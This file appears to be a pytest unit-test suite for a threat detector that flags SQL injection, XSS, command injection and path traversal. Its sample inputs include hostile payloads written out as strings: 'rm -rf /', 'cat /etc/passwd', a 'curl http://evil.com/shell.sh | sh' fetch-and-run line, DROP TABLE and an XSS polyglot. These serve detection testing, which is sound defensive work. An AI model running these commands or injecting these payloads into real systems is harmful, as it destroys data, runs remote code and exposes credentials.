"""
Unit tests for threat detection module.
"""
import pytest
from app.agents.nodes.threat_detectors import ThreatDetector, ThreatType


class TestSQLInjectionDetection:
    """Test cases for SQL injection detection."""
    
    def test_detect_union_select(self):
        """Test detection of UNION SELECT injection."""
        text = "' UNION SELECT * FROM users --"
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["detected"] is True
        assert result["threat_type"] == ThreatType.SQL_INJECTION.value
        assert result["confidence"] > 0
    
    def test_detect_or_equals(self):
        """Test detection of OR 1=1 injection."""
        text = "admin' OR '1'='1"
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["detected"] is True
    
    def test_detect_drop_table(self):
        """Test detection of DROP TABLE."""
        text = "'; DROP TABLE users; --"
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["detected"] is True
    
    def test_detect_sql_comments(self):
        """Test detection of SQL comments."""
        text = "admin'-- "
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["detected"] is True
    
    def test_detect_time_based_injection(self):
        """Test detection of time-based blind SQL injection."""
        text = "'; WAITFOR DELAY '00:00:10'--"
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["detected"] is True
    
    def test_no_sql_injection(self):
        """Test clean input without SQL injection."""
        text = "What is the weather today?"
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["detected"] is False


class TestXSSDetection:
    """Test cases for XSS detection."""
    
    def test_detect_script_tag(self):
        """Test detection of script tags."""
        text = "<script>alert('xss')</script>"
        result = ThreatDetector.detect_xss(text)
        
        assert result["detected"] is True
        assert result["threat_type"] == ThreatType.XSS.value
    
    def test_detect_javascript_protocol(self):
        """Test detection of javascript: protocol."""
        text = "<a href='javascript:alert(1)'>Click</a>"
        result = ThreatDetector.detect_xss(text)
        
        assert result["detected"] is True
    
    def test_detect_event_handler(self):
        """Test detection of event handlers."""
        text = "<img src=x onerror='alert(1)'>"
        result = ThreatDetector.detect_xss(text)
        
        assert result["detected"] is True
    
    def test_detect_iframe(self):
        """Test detection of iframe tags."""
        text = "<iframe src='http://evil.com'></iframe>"
        result = ThreatDetector.detect_xss(text)
        
        assert result["detected"] is True
    
    def test_detect_eval(self):
        """Test detection of eval function."""
        text = "eval('alert(1)')"
        result = ThreatDetector.detect_xss(text)
        
        assert result["detected"] is True
    
    def test_no_xss(self):
        """Test clean input without XSS."""
        text = "This is a normal paragraph"
        result = ThreatDetector.detect_xss(text)
        
        assert result["detected"] is False


class TestCommandInjectionDetection:
    """Test cases for command injection detection."""
    
    def test_detect_pipe_operator(self):
        """Test detection of pipe operator."""
        text = "test | cat /etc/passwd"
        result = ThreatDetector.detect_command_injection(text)
        
        assert result["detected"] is True
        assert result["threat_type"] == ThreatType.COMMAND_INJECTION.value
    
    def test_detect_semicolon_chaining(self):
        """Test detection of semicolon command chaining."""
        text = "test; rm -rf /"
        result = ThreatDetector.detect_command_injection(text)
        
        assert result["detected"] is True
    
    def test_detect_command_substitution(self):
        """Test detection of command substitution."""
        text = "test $(whoami)"
        result = ThreatDetector.detect_command_injection(text)
        
        assert result["detected"] is True
    
    def test_detect_backtick_execution(self):
        """Test detection of backtick command execution."""
        text = "test `ls -la`"
        result = ThreatDetector.detect_command_injection(text)
        
        assert result["detected"] is True
    
    def test_detect_dangerous_commands(self):
        """Test detection of dangerous commands."""
        text = "curl http://evil.com/shell.sh | sh"
        result = ThreatDetector.detect_command_injection(text)
        
        assert result["detected"] is True
    
    def test_no_command_injection(self):
        """Test clean input without command injection."""
        text = "Please explain how to use the command line"
        result = ThreatDetector.detect_command_injection(text)
        
        assert result["detected"] is False


class TestPathTraversalDetection:
    """Test cases for path traversal detection."""
    
    def test_detect_dotdot_slash(self):
        """Test detection of ../ pattern."""
        text = "../../etc/passwd"
        result = ThreatDetector.detect_path_traversal(text)
        
        assert result["detected"] is True
        assert result["threat_type"] == ThreatType.PATH_TRAVERSAL.value
    
    def test_detect_dotdot_backslash(self):
        """Test detection of ..\\ pattern."""
        text = "..\\..\\windows\\system32"
        result = ThreatDetector.detect_path_traversal(text)
        
        assert result["detected"] is True
    
    def test_detect_url_encoded(self):
        """Test detection of URL-encoded path traversal."""
        text = "%2e%2e%2f"
        result = ThreatDetector.detect_path_traversal(text)
        
        assert result["detected"] is True
    
    def test_no_path_traversal(self):
        """Test clean input without path traversal."""
        text = "What is the path to success?"
        result = ThreatDetector.detect_path_traversal(text)
        
        assert result["detected"] is False


class TestAllThreatsDetection:
    """Test cases for combined threat detection."""
    
    def test_detect_multiple_threats(self):
        """Test detection of multiple threat types."""
        text = "<script>alert(1)</script>' OR '1'='1"
        threats = ThreatDetector.detect_all_threats(text)
        
        assert len(threats) > 0
        threat_types = [t["threat_type"] for t in threats]
        assert ThreatType.XSS.value in threat_types
        assert ThreatType.SQL_INJECTION.value in threat_types
    
    def test_detect_no_threats(self):
        """Test clean input with no threats."""
        text = "What is the weather forecast for tomorrow?"
        threats = ThreatDetector.detect_all_threats(text)
        
        assert len(threats) == 0
    
    def test_polyglot_payload(self):
        """Test detection of polyglot payload."""
        # Polyglot payload that could work as XSS, SQL injection, etc.
        text = "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
        threats = ThreatDetector.detect_all_threats(text)
        
        assert len(threats) > 0


class TestThreatConfidence:
    """Test confidence scoring of threats."""
    
    def test_confidence_increases_with_matches(self):
        """Test that confidence increases with more matches."""
        # Single SQL keyword
        text1 = "SELECT * FROM users"
        result1 = ThreatDetector.detect_sql_injection(text1)
        
        # Multiple SQL keywords
        text2 = "SELECT * FROM users WHERE 1=1 OR 1=1 UNION SELECT password"
        result2 = ThreatDetector.detect_sql_injection(text2)
        
        assert result2["confidence"] >= result1["confidence"]
    
    def test_confidence_capped_at_one(self):
        """Test that confidence is capped at 1.0."""
        # Many SQL keywords
        text = "SELECT * FROM users WHERE 1=1 OR 1=1 UNION SELECT password DROP TABLE users DELETE FROM admin"
        result = ThreatDetector.detect_sql_injection(text)
        
        assert result["confidence"] <= 1.0
